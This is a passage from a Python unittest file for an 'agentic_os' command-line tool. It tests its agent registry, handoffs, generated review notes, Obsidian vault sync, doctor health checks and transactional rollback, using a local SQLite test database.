        self.assertEqual(agent_events[0][1]["kind"], "cloud")
        self.assertEqual(agent_events[1][0], "update")
        self.assertEqual(
            agent_events[1][1]["changed"], ["notes", "capabilities"]
        )
        self.assert_no_schema_drift()

    def test_update_unknown_agent_refuses(self):
        code, out, err = self.aos_fails(
            "agent", "update", "ghost", "--notes", "x"
        )
        self.assertIn("No agent 'ghost'", err)
        self.assertIn("agent add ghost", err)

    def test_update_requires_a_flag(self):
        self.add_codex()
        code, out, err = self.aos_fails("agent", "update", "codex")
        self.assertIn("Nothing to update", err)

    def test_show_unknown_agent_refuses(self):
        code, out, err = self.aos_fails("agent", "show", "ghost")
        self.assertIn("No agent 'ghost'", err)

    def test_agent_notes_sync_into_the_mirror(self):
        self.add_codex()
        self.aos("sync")
        vault = self.aos_dir / "obsidian-vault" / "AOS"
        self.assertTrue((vault / "Agents").is_dir())
        note = (vault / "Agents" / "codex.md").read_text("utf-8")
        self.assertIn("type: agent", note)
        self.assertIn("name: codex", note)
        self.assertIn("kind: cloud", note)
        self.assertIn("- code", note)
        self.assertIn("- review", note)
        self.assertIn("cloud codex agent", note)
        self.assertIn("  - aos/agent", note)
        self.aos("doctor")

    def test_sync_idempotent_with_agent_notes(self):
        self.add_codex()
        from agentic_os import utils as agentic_utils

        vault_aos = self.aos_dir / "obsidian-vault" / "AOS"
        self.aos("sync")
        hash1 = agentic_utils.tree_hash(vault_aos)
        out = self.aos("sync")
        self.assertIn("(0 written", out)
        self.assertEqual(agentic_utils.tree_hash(vault_aos), hash1)

    def test_add_and_update_are_atomic(self):
        conn = db.connect(self.db_path)
        try:
            with mock.patch.object(
                events, "emit", side_effect=RuntimeError("forced failure")
            ):
                with self.assertRaises(RuntimeError):
                    ops.add_agent(conn, name="codex")
            count = conn.execute(
                "SELECT COUNT(*) AS n FROM agents"
            ).fetchone()["n"]
            self.assertEqual(count, 0)
        finally:
            conn.close()
        self.add_codex()
        conn = db.connect(self.db_path)
        try:
            with mock.patch.object(
                events, "emit", side_effect=RuntimeError("forced failure")
            ):
                with self.assertRaises(RuntimeError):
                    ops.update_agent(conn, name="codex", notes="mutated")
            notes = conn.execute(
                "SELECT notes FROM agents WHERE name = 'codex'"
            ).fetchone()["notes"]
            self.assertEqual(notes, "cloud codex agent")
        finally:
            conn.close()


class ReviewCase(Night1BackCompatCase):
    def raw(self, sql: str, params=()) -> None:
        conn = sqlite3.connect(self.db_path)
        try:
            with conn:
                conn.execute(sql, params)
        finally:
            conn.close()

    def build(self, *argv: str) -> str:
        path = Path(self.aos("review", *argv).strip())
        return path.read_text("utf-8")

    @staticmethod
    def section(text: str, heading: str, next_heading: str) -> str:
        return text.split(f"## {heading}")[1].split(f"## {next_heading}")[0]


class TestReviewNewSections(ReviewCase):
    def test_new_sections_present_after_recent_runs(self):
        text = self.build("build")
        order = [
            "## Recent runs",
            "## Open handoffs",
            "## Stale in-progress tasks",
            "## Code tasks done without commit evidence",
            "## Memory needing refresh",
            "## Notes",
        ]
        positions = [text.index(heading) for heading in order]
        self.assertEqual(positions, sorted(positions))

    def test_open_handoffs_listed_until_accepted(self):
        self.aos(
            "handoff", "create", "T-0002", "--from", "claude-code",
            "--to", "codex", "--state", "half done",
        )
        text = self.build("build")
        section = self.section(
            text, "Open handoffs", "Stale in-progress tasks"
        )
        self.assertIn("[[H-0001]]", section)
        self.assertIn("claude-code → codex", section)
        self.assertIn("[[T-0002]]", section)
        self.aos("handoff", "accept", "H-0001")
        text = self.build("build")
        section = self.section(
            text, "Open handoffs", "Stale in-progress tasks"
        )
        self.assertIn("*(none)*", section)

    def test_stale_in_progress_without_open_run(self):
        self.aos("task", "assign", "T-0003", "-p", "demo")
        self.aos("task", "status", "T-0003", "ready")
        self.aos("task", "status", "T-0003", "in_progress")
        text = self.build("build")
        section = self.section(
            text, "Stale in-progress tasks",
            "Code tasks done without commit evidence",
        )
        self.assertIn("[[T-0003]]", section)
        self.assertIn("no open run", section)

    def test_stale_in_progress_with_old_open_run(self):
        self.aos("run", "start", "T-0002", "--agent", "codex")
        text = self.build("build")
        section = self.section(
            text, "Stale in-progress tasks",
            "Code tasks done without commit evidence",
        )
        self.assertNotIn("[[T-0002]]", section)  # fresh run = not stale
        self.raw("UPDATE runs SET started_at = '2000-01-01T00:00:00Z' WHERE id = 2")
        text = self.build("build")
        section = self.section(
            text, "Stale in-progress tasks",
            "Code tasks done without commit evidence",
        )
        self.assertIn("[[T-0002]]", section)
        self.assertIn("no run activity in the window", section)
        self.assertNotIn("no open run", section)

    def test_code_tasks_done_without_commit_evidence(self):
        text = self.build("build")
        section = self.section(
            text, "Code tasks done without commit evidence",
            "Memory needing refresh",
        )
        self.assertIn("[[T-0001]]", section)  # fixture: note evidence only
        self.aos(
            "evidence", "add", "T-0001", "--kind", "commit",
            "--ref", "0123abc", "--claim", "the fixing commit",
        )
        text = self.build("build")
        section = self.section(
            text, "Code tasks done without commit evidence",
            "Memory needing refresh",
        )
        self.assertIn("*(none)*", section)

    def test_memory_refresh_excludes_superseded_and_retired(self):
        add = [
            "memory", "add", "--scope", "project", "--project", "demo",
            "--kind", "fact", "--source", "human", "--confidence", "confirmed",
        ]
        self.aos(*add, "--key", "old-live", "--value", "v1")           # M-0001
        self.aos(*add, "--key", "old-live", "--value", "v2",
                 "--supersedes", "M-0001")                             # M-0002
        self.aos(*add, "--key", "retired-one", "--value", "v3")       # M-0003
        self.aos("memory", "retire", "M-0003")
        self.aos(*add, "--key", "fresh", "--value", "v4")             # M-0004
        self.raw(
            "UPDATE memory SET updated_at = '2000-01-01T00:00:00Z' "
            "WHERE id IN (1, 2, 3)"
        )
        text = self.build("build")
        refresh = text.split("## Memory needing refresh")[1].split("## Notes")[0]
        self.assertIn("[[M-0002]]", refresh)     # live + old → needs refresh
        self.assertNotIn("[[M-0001]]", refresh)  # superseded → excluded
        self.assertNotIn("[[M-0003]]", refresh)  # retired → excluded
        self.assertNotIn("[[M-0004]]", refresh)  # fresh → excluded
        # Regression pin for the D-W6.2 quirk: the OLD "Stale memory"
        # section still lists the superseded row, unchanged.
        stale = self.section(text, "Stale memory", "Recent runs")
        self.assertIn("[[M-0001]]", stale)


class TestReviewProject(ReviewCase):
    def setUp(self):
        super().setUp()
        self.aos(
            "project", "add", "other", "--name", "Other", "--repo", str(self.repo)
        )
        self.aos("task", "add", "Other project task", "-p", "other")  # T-0004

    def test_filters_every_section_to_the_project(self):
        out = self.aos("review", "project", "demo")
        path = Path(out.strip())
        self.assertEqual(path.name, "project-demo.md")
        text = path.read_text("utf-8")
        self.assertIn("— project demo", text.splitlines()[0])
        open_section = self.section(text, "Open tasks", "Recent evidence")
        self.assertIn("[[T-0002]]", open_section)
        self.assertNotIn("[[T-0004]]", open_section)  # other project
        self.assertNotIn("[[T-0003]]", open_section)  # projectless capture
        evidence_section = self.section(text, "Recent evidence", "Stale memory")
        self.assertIn("[[E-0001]]", evidence_section)  # demo task evidence
        commit_section = self.section(
            text, "Code tasks done without commit evidence",
            "Memory needing refresh",
        )
        self.assertIn("[[T-0001]]", commit_section)
        self.assert_no_schema_drift()

    def test_unknown_slug_refuses(self):
        code, out, err = self.aos_fails("review", "project", "ghost")
        self.assertIn("No project 'ghost'", err)

    def test_notes_preserved_and_idempotent(self):
        out = self.aos("review", "project", "demo")
        path = Path(out.strip())
        first = path.read_bytes()
        self.assertEqual(Path(self.aos("review", "project", "demo").strip()), path)
        self.assertEqual(path.read_bytes(), first)  # idempotent
        appended = b"\nmanual project note\r\nno trailing newline"
        with open(path, "ab") as fh:
            fh.write(appended)
        tail_before = path.read_bytes().split(b"## Notes", 1)[1]
        self.aos("task", "add", "Head regenerates", "-p", "demo")
        self.aos("review", "project", "demo")
        head, tail_after = path.read_bytes().split(b"## Notes", 1)
        self.assertEqual(tail_after, tail_before)
        self.assertIn(b"Head regenerates", head)

    def test_eventless_and_doctor_clean(self):
        conn = db.connect(self.db_path)
        try:
            before = conn.execute(
                "SELECT COUNT(*) AS n FROM events"
            ).fetchone()["n"]
        finally:
            conn.close()
        self.aos("review", "project", "demo")
        conn = db.connect(self.db_path)
        try:
            after = conn.execute(
                "SELECT COUNT(*) AS n FROM events"
            ).fetchone()["n"]
        finally:
            conn.close()
        self.assertEqual(before, after)
        self.aos("sync")
        self.aos("doctor")  # project-<slug>.md is a recognized Reviews note


class TestReviewWeekly(ReviewCase):
    def test_filename_title_and_out_of_week_window(self):
        out = self.aos("review", "weekly", "--date", "2001-01-03")
        path = Path(out.strip())
        self.assertEqual(path.name, "2001-W01.md")
        text = path.read_text("utf-8")
        self.assertEqual(text.splitlines()[0], "# Review week 2001-W01")
        evidence_section = self.section(text, "Recent evidence", "Stale memory")
        self.assertIn("*(none)*", evidence_section)  # fixture rows are recent
        runs_section = self.section(text, "Recent runs", "Open handoffs")
        self.assertIn("*(none)*", runs_section)

    def test_current_week_includes_fixture_activity(self):
        text = self.build("weekly")
        evidence_section = self.section(text, "Recent evidence", "Stale memory")
        self.assertIn("[[E-0001]]", evidence_section)
        runs_section = self.section(text, "Recent runs", "Open handoffs")
        self.assertIn("[[R-0001]]", runs_section)

    def test_notes_preserved_and_idempotent(self):
        out = self.aos("review", "weekly")
        path = Path(out.strip())
        first = path.read_bytes()
        self.aos("review", "weekly")
        self.assertEqual(path.read_bytes(), first)
        with open(path, "ab") as fh:
            fh.write(b"\nweekly manual note")
        tail_before = path.read_bytes().split(b"## Notes", 1)[1]
        self.aos("task", "add", "Weekly head regenerates", "-p", "demo")
        self.aos("review", "weekly")
        head, tail_after = path.read_bytes().split(b"## Notes", 1)
        self.assertEqual(tail_after, tail_before)
        self.assertIn(b"Weekly head regenerates", head)

    def test_bad_date_refused(self):
        for bad in ("tomorrow", "2026-13-40"):
            with self.subTest(bad=bad):
                code, out, err = self.aos_fails(
                    "review", "weekly", "--date", bad
                )
                self.assertTrue(
                    "Expected format: YYYY-MM-DD" in err
                    or "not a real calendar date" in err
                )

    def test_doctor_accepts_the_weekly_filename(self):
        self.aos("review", "weekly")
        self.aos("sync")
        self.aos("doctor")


class TestObsidianUsability(Night1BackCompatCase):
    INDEX_NOTES = (
        "Tasks", "Decisions", "Evidence", "Handoffs", "Memory", "Agents",
        "Reviews",
    )

    @property
    def vault_aos(self) -> Path:
        return self.aos_dir / "obsidian-vault" / "AOS"

    def test_index_notes_exist_after_init(self):
        for name in self.INDEX_NOTES:
            self.assertTrue(
                (self.vault_aos / f"{name}.md").is_file(), name
            )
        self.assertTrue((self.vault_aos / "Agents").is_dir())
        self.aos("doctor")

    def test_home_dashboard_at_a_glance_and_index(self):
        self.aos("sync")
        home = (self.vault_aos / "Home.md").read_text("utf-8")
        self.assertIn("## At a glance", home)
        self.assertIn("- projects: 1", home)
        self.assertIn("- open tasks: 2 (inbox 1 · ready 1 · in progress 0)", home)
        self.assertIn("- done tasks: 1", home)
        self.assertIn("- open runs: 0", home)
        self.assertIn("- evidence rows: 1", home)
        self.assertIn("## Index", home)
        for name in self.INDEX_NOTES:
            self.assertIn(f"[[{name}]]", home)
        # The Night-1 Home pins stay intact.
        self.assertIn("[[T-0001]]", home)
        self.assertIn("[[T-0002]]", home)
        self.assertIn("[[CONVENTIONS]]", home)

    def test_tasks_index_groups_open_and_done(self):
        self.aos("sync")
        text = (self.vault_aos / "Tasks.md").read_text("utf-8")
        open_section = text.split("## Open")[1].split("## Done")[0]
        self.assertIn("[[T-0002]]", open_section)
        self.assertIn("[[T-0003]]", open_section)
        self.assertNotIn("[[T-0001]]", open_section)
        done_section = text.split("## Done")[1]
        self.assertIn("[[T-0001]]", done_section)

    def test_indexes_reflect_every_entity_type(self):
        self.aos(
            "decision", "add", "Use SQLite", "-p", "demo",
            "--decision", "SQLite is the source of truth",
        )
        self.aos(
            "handoff", "create", "T-0002", "--from", "claude-code",
            "--to", "codex", "--state", "half done",
        )
        self.aos(
            "memory", "add", "--scope", "project", "--project", "demo",
            "--kind", "constraint", "--key", "storage",
            "--value", "SQLite only", "--source", "human",
            "--confidence", "confirmed",
        )
        self.aos("agent", "add", "codex", "--kind", "cloud")
        review_path = Path(self.aos("review", "build").strip())
        weekly_path = Path(self.aos("review", "weekly").strip())
        self.aos("review", "project", "demo")
        self.aos("sync")
        decisions = (self.vault_aos / "Decisions.md").read_text("utf-8")
        self.assertIn("[[D-0001]] [accepted] Use SQLite", decisions)
        handoffs = (self.vault_aos / "Handoffs.md").read_text("utf-8")
        self.assertIn("[[H-0001]] claude-code → codex · [[T-0002]] · open", handoffs)
        memory = (self.vault_aos / "Memory.md").read_text("utf-8")
        self.assertIn("[[M-0001]] storage · project · [confirmed]", memory)
        agents = (self.vault_aos / "Agents.md").read_text("utf-8")
        self.assertIn("[[codex]] cloud", agents)
        evidence = (self.vault_aos / "Evidence.md").read_text("utf-8")
        self.assertIn("[[E-0001]] note · night-1 proof · [[T-0001]]", evidence)
        reviews = (self.vault_aos / "Reviews.md").read_text("utf-8")
        self.assertIn(f"[[{review_path.stem}]]", reviews)
        self.assertIn(f"[[{weekly_path.stem}]]", reviews)
        self.assertIn("[[project-demo]]", reviews)
        self.aos("doctor")
        self.assert_no_schema_drift()

    def test_sync_idempotent_with_every_note_type_present(self):
        # The P6 gate: two syncs, identical tree hash, with EVERY generated
        # note type in the mirror — including agents, index notes, and all
        # three review shapes.
        self.aos(
            "decision", "add", "Use SQLite", "-p", "demo",
            "--decision", "SQLite is the source of truth", "--task", "T-0002",
        )
        self.aos(
            "handoff", "create", "T-0002", "--from", "claude-code",
            "--to", "codex", "--state", "half done",
        )
        self.aos("handoff", "accept", "H-0001")
        self.aos(
            "memory", "add", "--scope", "global", "--kind", "preference",
            "--key", "style", "--value", "tabs", "--source", "human",
            "--confidence", "confirmed",
        )
        self.aos(
            "agent", "add", "codex", "--kind", "cloud", "--capability", "code"
        )
        self.aos("review", "build")
        self.aos("review", "weekly")
        self.aos("review", "project", "demo")
        from agentic_os import utils as agentic_utils

        self.aos("sync")
        for rel in (
            "Agents/codex.md",
            "Decisions/D-0001.md",
            "Handoffs/H-0001.md",
            "Memory/M-0001.md",
            "Tasks.md",
            "Reviews.md",
            "Reviews/project-demo.md",
        ):
            self.assertTrue((self.vault_aos / rel).is_file(), rel)
        hash1 = agentic_utils.tree_hash(self.vault_aos)
        out = self.aos("sync")
        self.assertIn("(0 written", out)
        self.assertEqual(agentic_utils.tree_hash(self.vault_aos), hash1)
        self.aos("doctor")
        self.assert_no_schema_drift()


class TestDoctorCompleteTodayHardening(Night1BackCompatCase):
    """P7: each new check passes clean and fails on a deliberately
    corrupted invariant; the commit-evidence line warns without failing."""

    NEW_CHECKS = (
        "agent registry rows are well-formed",
        "dropfile ingest events carry their dedupe hash",
        "generated notes have well-formed frontmatter",
        "database integrity_check passes",
    )

    def corrupt(self, sql: str, params=()) -> None:
        conn = sqlite3.connect(self.db_path)
        try:
            with conn:
                conn.execute(sql, params)
        finally:
            conn.close()

    def doctor(self) -> tuple[int, str]:
        code, out, err = self.run_cli("--root", str(self.root), "doctor")
        return code, out

    def assert_single_failure(self, check_name: str, *expected_details: str):
        code, out = self.doctor()
        self.assertEqual(code, 1, out)
        failed = [l for l in out.splitlines() if l.startswith("[FAIL]")]
        self.assertEqual(len(failed), 1, out)
        self.assertIn(f"[FAIL] {check_name}", failed[0])
        for detail in expected_details:
            self.assertIn(detail, failed[0])

    def test_new_checks_pass_on_a_clean_workspace(self):
        code, out = self.doctor()
        self.assertEqual(code, 0, out)
        for name in self.NEW_CHECKS:
            self.assertIn(f"[PASS] {name}", out)

    def test_fails_on_malformed_agent_row(self):
        self.corrupt(
            "INSERT INTO agents (name, kind, capabilities_json) "
            "VALUES ('rogue', 'robot', 'not json')"
        )
        self.assert_single_failure(
            "agent registry rows are well-formed",
            "rogue",
            "unknown kind 'robot'",
            "capabilities_json does not parse",
        )

    def test_fails_on_ingest_event_missing_its_hash(self):
        self.corrupt(
            "INSERT INTO events (ts, actor, entity, entity_id, action, "
            "payload_json) VALUES ('2026-01-01T00:00:00Z', 'agent:x', "
            "'system', NULL, 'dropfile_ingest', '{\"schema_version\": 1}')"
        )
        self.assert_single_failure(
            "dropfile ingest events carry their dedupe hash",
            "missing sha256",
        )

    def test_fails_on_broken_frontmatter(self):
        note = (
            self.aos_dir / "obsidian-vault" / "AOS" / "Tasks" / "T-0001.md"
        )
        text = note.read_text("utf-8")
        self.assertTrue(text.startswith("---\n"))
        note.write_text("***\n" + text[4:], encoding="utf-8")
        self.assert_single_failure(
            "generated notes have well-formed frontmatter",
            "Tasks/T-0001.md",
            "missing opening '---'",
        )

    def test_warn_line_is_non_fatal_and_clears_with_commit_evidence(self):
        # Fixture T-0001: code task closed with note evidence → WARN, exit 0.
        code, out = self.doctor()
        self.assertEqual(code, 0, out)
        warn_lines = [
            l for l in out.splitlines() if l.startswith("[WARN]")
        ]
        self.assertEqual(len(warn_lines), 1)
        self.assertIn("code tasks done without commit evidence", warn_lines[0])
        self.assertIn("T-0001", warn_lines[0])
        self.aos(
            "evidence", "add", "T-0001", "--kind", "commit",
            "--ref", "0123abcd", "--claim", "the shipping commit",
        )
        code, out = self.doctor()
        self.assertEqual(code, 0, out)
        self.assertIn(
            "[PASS] code tasks done without commit evidence", out
        )
        self.assertNotIn("[WARN]", out)


class TestTaskLifecycleAtomicity(WeekendOpsTestCase):
    """assign / edit / status write domain row + event in ONE transaction."""

    def setUp(self):
        super().setUp()
        ops.add_project(self.conn, slug="demo", name="Demo", repo=str(self.repo))

    def test_assign_rolls_back_with_failed_event(self):
        task = ops.capture_inbox(self.conn, "stranded capture")
        events_before = self.event_count()
        with mock.patch.object(
            events, "emit", side_effect=RuntimeError("forced failure")
        ):
            with self.assertRaises(RuntimeError):
                ops.assign_task(self.conn, task_id=task.id, project_slug="demo")
        self.assertEqual(self.event_count(), events_before)
        self.assertIsNone(ops.get_task(self.conn, task.id).project_id)

    def test_edit_rolls_back_with_failed_event(self):
        task = ops.add_task(self.conn, title="Original", project_slug="demo")
        events_before = self.event_count()
        with mock.patch.object(
            events, "emit", side_effect=RuntimeError("forced failure")
        ):
            with self.assertRaises(RuntimeError):
                ops.edit_task(self.conn, task_id=task.id, title="Mutated")
        self.assertEqual(self.event_count(), events_before)
        self.assertEqual(ops.get_task(self.conn, task.id).title, "Original")

    def test_status_rolls_back_with_failed_event(self):
        task = ops.add_task(self.conn, title="Work", project_slug="demo")
        events_before = self.event_count()
        with mock.patch.object(
            events, "emit", side_effect=RuntimeError("forced failure")
        ):
            with self.assertRaises(RuntimeError):
                ops.set_task_status(
                    self.conn, task_id=task.id, status="in_progress"
                )
        self.assertEqual(self.event_count(), events_before)
        self.assertEqual(ops.get_task(self.conn, task.id).status, "ready")


if __name__ == "__main__":
    unittest.main()
